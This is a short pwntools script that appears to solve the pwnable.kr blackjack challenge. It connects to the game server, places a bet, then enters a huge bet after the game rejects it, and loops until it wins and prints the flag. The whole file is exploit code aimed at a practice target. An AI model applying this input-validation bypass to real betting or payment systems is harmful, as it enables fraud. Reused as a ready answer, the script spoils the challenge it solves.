from pwn import *
#context.log_level = 'debug'

recv = []
cn = remote('pwnable.kr', 9009)
print cn.recv()
print cn.recv()
print cn.recv()
cn.sendline('y')
cn.recv() # clears screen
print cn.recv()
cn.sendline('1')
cn.recv() # clears screen
print cn.recv()

log.info('Tring to bet $600')
cn.sendline('600')
print cn.recv()
print cn.recv()

log.info('Tring to bet $100000000')
cn.sendline('100000000')
# print cn.recv()
# print cn.recv()
# print cn.recv()
# print cn.recv()

data = cn.recv() # '\n\nWould You Like to Hit or Stay?\nPlease Enter H to Hit or S to Stay.\n'
# cn.recv()
while True:
    print data
    # You Lose, Woah Buddy -> 'y' -> if (Game Over -> 'y'), You Win! -> 'y' -> flag
    if 'You Lose' in data or 'Woah Buddy' in data:
        cn.sendline('y')
        log.info('Play Again')
        print cn.recv()
        data = cn.recv()
    elif 'Hit or Stay' in data: 
        cn.sendline('h')
        log.info('hit')
        print cn.recv()
        data = cn.recv()
    elif 'You Win!' in data:
        cn.sendline('y')
        log.info('Play Again')
        cn.recv()
        log.info('FLAG : ' + cn.recv().split('\n')[0])
        break;
    else: # 'Game Over' in data:
        cn.sendline('y')
        log.info('Bankrupt')
        break;
